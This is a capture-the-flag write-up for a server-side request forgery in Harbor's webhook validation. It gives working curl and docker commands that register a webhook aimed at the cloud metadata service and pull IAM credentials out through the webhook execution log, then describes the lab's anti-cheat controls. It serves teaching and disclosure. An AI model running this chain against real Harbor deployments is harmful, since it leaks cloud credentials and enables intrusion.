# Writeup: GHSA-2phj-cp9f-qq6w (Harbor webhook SSRF)

The bug ([GHSA-2phj-cp9f-qq6w](https://github.com/goharbor/harbor/security/advisories/GHSA-2phj-cp9f-qq6w), fixed in v2.15.3): `validateTargets()` only checks that a webhook target address has an http/https scheme and parses — private, loopback, link-local and cloud-metadata addresses are all accepted, and jobservice later POSTs the stored address verbatim. When the target answers with an **error status**, its response body is written to the webhook execution log, which any project member can read. That is the only channel through which the flag can leave the metadata service, so the whole solve is: point a webhook at the IMDS, fire it, read the log.

All commands run inside the VM over SSH as `ctf`. The Harbor registry/API listens on `http://127.0.0.1` (`127.0.0.0/8` is a default insecure registry, no daemon config needed).

## Step 1 — create a project owned by the attacker account

With `project_creation_restriction: everyone`, any registered user can create a project; its creator automatically becomes ProjectAdmin, which holds `NotificationPolicy:create` — all this SSRF needs:

```shell
ctf@harbor-v2-15-2:~$ curl -s -o /dev/null -w '%{http_code}\n' -u attacker:Attacker12345 -X POST http://127.0.0.1/api/v2.0/projects \
    -H 'Content-Type: application/json' \
    -d '{"project_name":"ssrf","metadata":{"public":"false"}}'
201
```

## Step 2 — point a webhook at the metadata service

The `201 Created` is the bug: a link-local address is accepted without validation.

```shell
ctf@harbor-v2-15-2:~$ curl -s -o /dev/null -w '%{http_code}\n' -u attacker:Attacker12345 -X POST \
    http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies \
    -H 'Content-Type: application/json' \
    -d '{"name":"ssrf-poc","description":"","enabled":true,"event_types":["PUSH_ARTIFACT"],"targets":[{"type":"http","address":"http://169.254.169.254/latest/meta-data/iam/security-credentials/harbor-instance-role","auth_header":"","skip_cert_verify":false}]}'
201
```

The fake IMDS answers every request with `404` + the credentials body — the error status is what makes jobservice store the body in the execution log.

## Step 3 — fire it: push any image

The sudo whitelist covers exactly this flow (`login` → `pull` → `tag` → `push`; push is pinned to `127.0.0.1`):

```shell
ctf@harbor-v2-15-2:~$ sudo docker login 127.0.0.1 -u attacker -p Attacker12345
ctf@harbor-v2-15-2:~$ sudo docker pull alpine:3.19
ctf@harbor-v2-15-2:~$ sudo docker tag alpine:3.19 127.0.0.1/ssrf/alpine:3.19
ctf@harbor-v2-15-2:~$ sudo docker push 127.0.0.1/ssrf/alpine:3.19
```

The push fires `PUSH_ARTIFACT`; jobservice POSTs the event to `http://169.254.169.254/...` from inside the Harbor deployment — the only egress that can reach it (VM egress to `169.254.169.254` is firewalled; that is why this has to go through the SSRF).

## Step 4 — read the delivery back from the execution log

List the executions to get the IDs (they do not start from 1):

```shell
ctf@harbor-v2-15-2:~$ curl -s -u attacker:Attacker12345 http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies/1/executions | python3 -m json.tool
...
```

Then fetch the task log — the 404 body jobservice recorded contains the credentials:

```shell
ctf@harbor-v2-15-2:~$ curl -s -u attacker:Attacker12345 http://127.0.0.1/api/v2.0/projects/ssrf/webhook/policies/1/executions/<exec_id>/tasks/<task_id>/log
...
[ERROR] ... exit webhook job, error: abnormal response code: 404, body: {
  "Code": "Success",
  ...
  "SecretAccessKey": "flag{ghsa-2phj-cp9f-qq6w_test_flag}",
  ...
}
```

The `SecretAccessKey` is the flag. Submit it.

## Why the anti-cheat holds

- `curl http://169.254.169.254/...` from the VM: filter `OUTPUT REJECT` (and no `OUTPUT` redirect exists — unlike `vul/ghsa-2phj-cp9f-qq6w`).
- `curl http://127.0.0.1:8169/` or the bridge IP: filter `INPUT REJECT` on `lo` for `:8169`; redirected container traffic arrives on the bridge interface and passes.
- `sudo docker run/exec/inspect`: not in the whitelist; `docker push` is pinned to `127.0.0.1/*`.
- `/root/flag`: `chmod 400 root:root`, root password locked.
- Stock `admin` / `Harbor12345`: rotated to a random value at boot by `setup-challenge.sh` (and admin would still need this same SSRF to reach the flag).
